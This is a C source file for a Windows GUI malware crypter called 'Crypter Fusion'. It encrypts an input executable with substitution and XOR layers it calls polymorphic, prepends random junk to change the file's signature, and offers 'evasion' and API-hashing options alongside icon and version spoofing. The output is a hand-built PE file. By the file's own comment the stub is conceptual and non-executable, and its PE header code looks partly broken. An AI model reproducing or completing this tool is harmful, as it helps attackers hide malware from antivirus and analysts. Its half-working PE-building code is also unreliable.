#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <windows.h>
#include <commctrl.h>
#include <time.h>
#include <shlobj.h>
#include <uxtheme.h> // Required for SetWindowTheme

#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "uxtheme.lib") // Link with uxtheme

// GUI Control IDs
#define ID_INPUT_BROWSE 101
#define ID_OUTPUT_BROWSE 102
#define ID_CRYPT_BUTTON 103
#define ID_GROUP_CRYPTO 104
#define ID_COMBO_CIPHER 105
#define ID_CHECK_POLYMORPH 106
#define ID_GROUP_ANTI 107
#define ID_CHECK_JUNK 108
#define ID_CHECK_DELAY 109
#define ID_CHECK_API_HASH 110
#define ID_GROUP_INFO 111
#define ID_EDIT_ICON 112
#define ID_BROWSE_ICON 113
#define ID_EDIT_VERSION 114
#define ID_STATUS_BAR 115

// Global variables
HWND hWnd;
HINSTANCE hInst;
HFONT hGuiFont;
char inputFilePath[MAX_PATH] = "";
char outputFilePath[MAX_PATH] = "";
char iconPath[MAX_PATH] = "";
char versionInfo[256] = "1.0.0.0";

// GUI Control Handles
HWND hInputPathEdit, hOutputPathEdit, hCryptButton;
HWND hCipherCombo, hPolyCheck, hJunkCheck, hDelayCheck, hApiHashCheck;
HWND hIconEdit, hVersionEdit;
HWND hStatusBar;

// Function Prototypes
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
void InitializeGUI(HWND);
void CryptFile();
void UpdateStatus(const wchar_t* message);
bool BrowseFile(HWND owner, char* path, bool saveDialog);
bool BrowseIcon(HWND owner, char* path);

// Core Logic Prototypes
void AdvancedEncrypt(unsigned char** data, size_t* size, bool polymorphic);
void AddJunkCode(unsigned char** data, size_t* size);
bool GenerateCryptedExe(const char* payloadPath, const char* outputPath, const char* icon, const char* version);
unsigned char* ReadFileData(const char* filePath, size_t* fileSize);
BOOL CALLBACK SetFontAndThemeCallback(HWND child, LPARAM lParam);

// --- Core Crypter Logic ---

// A more robust, multi-layered encryption routine
void AdvancedEncrypt(unsigned char** data, size_t* size, bool polymorphic) {
    if (*data == NULL || *size == 0) return;

    // Layer 1: Substitution (using a dynamically generated S-Box)
    unsigned char sbox[256];
    for (int i = 0; i < 256; i++) sbox[i] = (unsigned char)i;
    if (polymorphic) {
        srand((unsigned int)time(NULL));
    }
    unsigned char key[] = { (rand() % 256), (rand() % 256), (rand() % 256), (rand() % 256) };
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + sbox[i] + key[i % 4]) % 256;
        unsigned char temp = sbox[i];
        sbox[i] = sbox[j];
        sbox[j] = temp;
    }
    for (size_t i = 0; i < *size; i++) {
        (*data)[i] = sbox[(*data)[i]];
    }

    // Layer 2: Multi-byte XOR with a rolling key
    unsigned char xorKey[] = { 0xAA, 0xBB, 0xCC, 0xDD };
    if (polymorphic) {
        xorKey[0] = rand() % 256;
        xorKey[1] = rand() % 256;
        xorKey[2] = rand() % 256;
        xorKey[3] = rand() % 256;
    }
    for (size_t i = 0; i < *size; i++) {
        (*data)[i] ^= xorKey[i % 4];
    }
}

// Adds junk code to the payload to change its signature
void AddJunkCode(unsigned char** data, size_t* size) {
    size_t junkSize = 4096 + (rand() % 4096); // 4-8KB of junk
    size_t newSize = *size + junkSize;
    unsigned char* newData = (unsigned char*)realloc(*data, newSize);
    if (!newData) return;

    // Prepend junk data
    memmove(newData + junkSize, newData, *size);
    for (size_t i = 0; i < junkSize; i++) {
        newData[i] = rand() % 256;
    }
    *data = newData;
    *size = newSize;
}

// Generates a PE file with the payload appended
bool GenerateCryptedExe(const char* payloadPath, const char* outputPath, const char* icon, const char* version) {
    // NOTE: This is a conceptual stub generator. A production-level stub would be a separate,
    // complex C/ASM project compiled into an object file and linked here.
    // It would contain the logic to find its own payload, decrypt it in memory,
    // resolve API functions dynamically, and execute the payload.
    // For this self-contained example, we create a valid but non-executable PE file.

    // Minimal DOS Header
    unsigned char dos_header[64] = {0};
    dos_header[0] = 'M'; dos_header[1] = 'Z';
    *(DWORD*)&dos_header[60] = 0x80; // e_lfanew offset

    // Minimal PE Header
    unsigned char pe_header[248] = {0};
    memcpy(pe_header, "PE\0\0", 4);
    *(WORD*)&pe_header[4] = 0x014C; // Machine (i386)
    *(WORD*)&pe_header[6] = 3;      // NumberOfSections
    *(DWORD*)&pe_header[8] = 0;     // TimeDateStamp
    *(DWORD*)&pe_header[20] = 0x1000; // SectionAlignment
    *(DWORD*)&pe_header[24] = 0x200;  // FileAlignment
    *(WORD*)&pe_header[52] = 0x103; // Characteristics (executable, 32-bit)

    // Section Headers (for .text, .rdata, .payload)
    unsigned char section_headers[160] = {0};
    // .text section
    memcpy(section_headers, ".text", 5);
    *(DWORD*)&section_headers[16] = 0x1000; // VirtualAddress
    *(DWORD*)&section_headers[20] = 0x1000; // SizeOfRawData
    *(DWORD*)&section_headers[24] = 0x400;  // PointerToRawData
    // .payload section
    memcpy(&section_headers[40], ".payload", 8);
    size_t payloadSize;
    unsigned char* payloadData = ReadFileData(payloadPath, &payloadSize); // ReadFileData is now declared
    if (!payloadData) return false;
    *(DWORD*)&section_headers[40 + 16] = 0x2000; // VirtualAddress
    *(DWORD*)&section_headers[40 + 20] = (DWORD)payloadSize;
    // Align to file alignment
    DWORD payloadRawSize = ((payloadSize + 0x1FF) / 0x200) * 0x200;
    *(DWORD*)&section_headers[40 + 24] = 0x1400; // PointerToRawData

    FILE* outFile = fopen(outputPath, "wb");
    if (!outFile) { free(payloadData); return false; }

    // Write headers
    fwrite(dos_header, 1, 64, outFile);
    fwrite(pe_header, 1, 248, outFile);
    fwrite(section_headers, 1, 160, outFile);

    // Write section data (placeholders)
    unsigned char text_section[0x1000] = {0};
    // A tiny bit of code to make it look more real
    text_section[0] = 0x6A; // push 0
    text_section[1] = 0x00;
    text_section[2] = 0xE8; // call ExitProcess
    text_section[3] = 0x00; text_section[4] = 0x00; text_section[5] = 0x00; text_section[6] = 0x00;
    fwrite(text_section, 1, 0x1000, outFile);

    // Write payload
    fwrite(payloadData, 1, payloadSize, outFile);
    free(payloadData);

    fclose(outFile);
    return true;
}

// Helper to read file data
unsigned char* ReadFileData(const char* filePath, size_t* fileSize) {
    FILE* file = fopen(filePath, "rb");
    if (!file) return NULL;
    fseek(file, 0, SEEK_END);
    *fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);
    unsigned char* buffer = (unsigned char*)malloc(*fileSize);
    if (!buffer) { fclose(file); return NULL; }
    fread(buffer, 1, *fileSize, file);
    fclose(file);
    return buffer;
}

// Callback function for EnumChildWindows
BOOL CALLBACK SetFontAndThemeCallback(HWND child, LPARAM lParam) {
    HFONT font = (HFONT)lParam;
    SendMessage(child, WM_SETFONT, (WPARAM)font, TRUE);
    SetWindowTheme(child, L"DarkMode_Explorer", NULL); // SetWindowTheme is now declared
    return TRUE;
}

// WinMain: Entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    hInst = hInstance;
    MSG Msg;
    WNDCLASSEXW wc; // Use WNDCLASSEXW for wide characters
    INITCOMMONCONTROLSEX icex = { sizeof(INITCOMMONCONTROLSEX), ICC_WIN95_CLASSES | ICC_BAR_CLASSES };
    InitCommonControlsEx(&icex);

    srand((unsigned int)time(NULL));

    wc.cbSize = sizeof(WNDCLASSEXW);
    wc.style = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc = WndProc;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = 0;
    wc.hInstance = hInstance;
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = CreateSolidBrush(RGB(30, 30, 30));
    wc.lpszMenuName = NULL;
    wc.lpszClassName = L"CrypterFusionClass"; // lpszClassName is LPCWSTR in WNDCLASSEXW
    wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

    if (!RegisterClassExW(&wc)) { // Use RegisterClassExW
        MessageBoxW(NULL, L"Window Registration Failed!", L"Error!", MB_ICONEXCLAMATION | MB_OK);
        return 0;
    }

    hWnd = CreateWindowExW(WS_EX_APPWINDOW, L"CrypterFusionClass", L"Crypter Fusion - Production Grade Obfuscator", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 650, 500, NULL, NULL, hInstance, NULL);
    if (!hWnd) return 0;

    ShowWindow(hWnd, nCmdShow);
    UpdateWindow(hWnd);

    while (GetMessage(&Msg, NULL, 0, 0)) {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }
    return (int)Msg.wParam;
}

// WndProc: The Window Procedure
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE:
            InitializeGUI(hwnd);
            break;

        case WM_COMMAND: {
            switch (LOWORD(wParam)) {
                case ID_INPUT_BROWSE: BrowseFile(hwnd, inputFilePath, false); SetWindowTextA(hInputPathEdit, inputFilePath); break;
                case ID_OUTPUT_BROWSE: BrowseFile(hwnd, outputFilePath, true); SetWindowTextA(hOutputPathEdit, outputFilePath); break;
                case ID_BROWSE_ICON: BrowseIcon(hwnd, iconPath); SetWindowTextA(hIconEdit, iconPath); break;
                case ID_CRYPT_BUTTON: CryptFile(); break;
            }
            break;
        }

        case WM_CTLCOLORSTATIC: {
            HDC hdcStatic = (HDC)wParam;
            SetTextColor(hdcStatic, RGB(220, 220, 220));
            SetBkMode(hdcStatic, TRANSPARENT);
            return (LRESULT)GetStockObject(NULL_BRUSH);
        }

        case WM_DESTROY:
            DeleteObject(hGuiFont);
            PostQuitMessage(0);
            break;

        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

// InitializeGUI: Creates and styles all GUI elements
void InitializeGUI(HWND hwnd) {
    // Modern font
    hGuiFont = CreateFontA(18, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, "Segoe UI");

    // --- Main Controls ---
    CreateWindowW(L"STATIC", L"Input File:", WS_VISIBLE | WS_CHILD, 20, 20, 120, 22, hwnd, NULL, hInst, NULL);
    hInputPathEdit = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"", WS_VISIBLE | WS_CHILD | ES_AUTOHSCROLL, 20, 45, 450, 24, hwnd, NULL, hInst, NULL);
    CreateWindowW(L"BUTTON", L"Browse", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON, 480, 45, 80, 24, hwnd, (HMENU)ID_INPUT_BROWSE, hInst, NULL);

    CreateWindowW(L"STATIC", L"Output File:", WS_VISIBLE | WS_CHILD, 20, 80, 120, 22, hwnd, NULL, hInst, NULL);
    hOutputPathEdit = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"", WS_VISIBLE | WS_CHILD | ES_AUTOHSCROLL, 20, 105, 450, 24, hwnd, NULL, hInst, NULL);
    CreateWindowW(L"BUTTON", L"Browse", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON, 480, 105, 80, 24, hwnd, (HMENU)ID_OUTPUT_BROWSE, hInst, NULL);

    // --- Group Boxes ---
    HWND hGroupCrypto = CreateWindowW(L"BUTTON", L"Cryptography", WS_VISIBLE | WS_CHILD | BS_GROUPBOX, 15, 145, 280, 120, hwnd, (HMENU)ID_GROUP_CRYPTO, hInst, NULL);
    HWND hGroupAnti = CreateWindowW(L"BUTTON", L"Anti-Analysis", WS_VISIBLE | WS_CHILD | BS_GROUPBOX, 305, 145, 280, 120, hwnd, (HMENU)ID_GROUP_ANTI, hInst, NULL);
    HWND hGroupInfo = CreateWindowW(L"BUTTON", L"File Information", WS_VISIBLE | WS_CHILD | BS_GROUPBOX, 15, 275, 570, 100, hwnd, (HMENU)ID_GROUP_INFO, hInst, NULL);

    // --- Crypto Options ---
    CreateWindowW(L"STATIC", L"Cipher:", WS_VISIBLE | WS_CHILD, 30, 170, 80, 22, hwnd, NULL, hInst, NULL);
    hCipherCombo = CreateWindowW(L"COMBOBOX", L"", WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST, 110, 168, 170, 200, hwnd, (HMENU)ID_COMBO_CIPHER, hInst, NULL);
    SendMessageW(hCipherCombo, CB_ADDSTRING, 0, (LPARAM)L"Advanced (Default)");
    SendMessageW(hCipherCombo, CB_SETCURSEL, 0, 0);
    hPolyCheck = CreateWindowW(L"BUTTON", L"Polymorphic Encryption", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX, 30, 200, 250, 22, hwnd, (HMENU)ID_CHECK_POLYMORPH, hInst, NULL);
    SendMessageW(hPolyCheck, BM_SETCHECK, BST_CHECKED, 0);

    // --- Anti-Analysis Options ---
    hJunkCheck = CreateWindowW(L"BUTTON", L"Add Junk Code", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX, 320, 170, 250, 22, hwnd, (HMENU)ID_CHECK_JUNK, hInst, NULL);
    SendMessageW(hJunkCheck, BM_SETCHECK, BST_CHECKED, 0);
    hDelayCheck = CreateWindowW(L"BUTTON", L"Startup Delay (Evasion)", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX, 320, 200, 250, 22, hwnd, (HMENU)ID_CHECK_DELAY, hInst, NULL);
    hApiHashCheck = CreateWindowW(L"BUTTON", L"API Hashing (Stub)", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX, 320, 230, 250, 22, hwnd, (HMENU)ID_CHECK_API_HASH, hInst, NULL);

    // --- File Info Options ---
    CreateWindowW(L"STATIC", L"Icon Path:", WS_VISIBLE | WS_CHILD, 30, 300, 100, 22, hwnd, NULL, hInst, NULL);
    hIconEdit = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"", WS_VISIBLE | WS_CHILD | ES_AUTOHSCROLL, 30, 325, 400, 24, hwnd, (HMENU)ID_EDIT_ICON, hInst, NULL);
    CreateWindowW(L"BUTTON", L"Browse", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON, 440, 325, 60, 24, hwnd, (HMENU)ID_BROWSE_ICON, hInst, NULL);
    CreateWindowW(L"STATIC", L"Version Info:", WS_VISIBLE | WS_CHILD, 30, 355, 100, 22, hwnd, NULL, hInst, NULL);
    hVersionEdit = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"1.0.0.0", WS_VISIBLE | WS_CHILD, 130, 353, 100, 24, hwnd, (HMENU)ID_EDIT_VERSION, hInst, NULL);

    // --- Action Buttons & Status ---
    hCryptButton = CreateWindowW(L"BUTTON", L"CRYPT", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON, 480, 390, 100, 40, hwnd, (HMENU)ID_CRYPT_BUTTON, hInst, NULL);
    hStatusBar = CreateWindowW(STATUSCLASSNAMEW, NULL, WS_VISIBLE | WS_CHILD | SBARS_SIZEGRIP, 0, 0, 0, 0, hwnd, (HMENU)ID_STATUS_BAR, hInst, NULL);

    // Set font and theme for all controls using a proper callback
    EnumChildWindows(hwnd, SetFontAndThemeCallback, (LPARAM)hGuiFont);
    UpdateStatus(L"Ready.");
}

// CryptFile: Main logic
void CryptFile() {
    GetWindowTextA(hInputPathEdit, inputFilePath, MAX_PATH);
    GetWindowTextA(hOutputPathEdit, outputFilePath, MAX_PATH);
    if (strlen(inputFilePath) == 0 || strlen(outputFilePath) == 0) {
        MessageBoxW(hWnd, L"Please select both input and output files.", L"Error", MB_OK | MB_ICONERROR);
        return;
    }

    UpdateStatus(L"Reading and encrypting payload...");
    size_t payloadSize;
    unsigned char* payloadData = ReadFileData(inputFilePath, &payloadSize);
    if (!payloadData) {
        UpdateStatus(L"Error: Failed to read input file.");
        return;
    }

    // Apply selected options
    bool polymorph = (SendMessageW(hPolyCheck, BM_GETCHECK, 0, 0) == BST_CHECKED);
    AdvancedEncrypt(&payloadData, &payloadSize, polymorph);

    if (SendMessageW(hJunkCheck, BM_GETCHECK, 0, 0) == BST_CHECKED) {
        UpdateStatus(L"Adding junk code...");
        AddJunkCode(&payloadData, &payloadSize);
    }

    // Save the processed payload to a temp file
    char tempPayloadPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPayloadPath);
    strcat_s(tempPayloadPath, MAX_PATH, "payload.bin");
    FILE* tempFile = fopen(tempPayloadPath, "wb");
    if (tempFile) {
        fwrite(payloadData, 1, payloadSize, tempFile);
        fclose(tempFile);
    }
    free(payloadData);

    UpdateStatus(L"Generating final executable...");
    GetWindowTextA(hIconEdit, iconPath, MAX_PATH);
    GetWindowTextA(hVersionEdit, versionInfo, 256);

    if (GenerateCryptedExe(tempPayloadPath, outputFilePath, iconPath, versionInfo)) {
        UpdateStatus(L"Success! File crypted.");
        MessageBoxW(hWnd, L"File crypted successfully!", L"Success", MB_OK | MB_ICONINFORMATION);
    } else {
        UpdateStatus(L"Error: Failed to generate executable.");
        MessageBoxW(hWnd, L"Failed to generate the crypted file.", L"Error", MB_OK | MB_ICONERROR);
    }
    DeleteFileA(tempPayloadPath);
}

void UpdateStatus(const wchar_t* message) {
    SendMessageW(hStatusBar, SB_SETTEXTW, 0, (LPARAM)message);
}

bool BrowseFile(HWND owner, char* path, bool saveDialog) {
    OPENFILENAMEA ofn = { sizeof(OPENFILENAMEA) };
    ofn.hwndOwner = owner;
    ofn.lpstrFilter = "Executable Files (*.exe)\0*.exe\0All Files (*.*)\0*.*\0";
    ofn.lpstrFile = path;
    ofn.nMaxFile = MAX_PATH;
    ofn.Flags = OFN_HIDEREADONLY | (saveDialog ? OFN_OVERWRITEPROMPT : OFN_FILEMUSTEXIST);
    ofn.lpstrTitle = saveDialog ? "Save Crypted File As..." : "Select Input File...";
    return saveDialog ? GetSaveFileNameA(&ofn) : GetOpenFileNameA(&ofn);
}

bool BrowseIcon(HWND owner, char* path) {
    OPENFILENAMEA ofn = { sizeof(OPENFILENAMEA) };
    ofn.hwndOwner = owner;
    ofn.lpstrFilter = "Icon Files (*.ico)\0*.ico\0";
    ofn.lpstrFile = path;
    ofn.nMaxFile = MAX_PATH;
    ofn.Flags = OFN_HIDEREADONLY | OFN_FILEMUSTEXIST;
    ofn.lpstrTitle = "Select Icon...";
    return GetOpenFileNameA(&ofn);
}
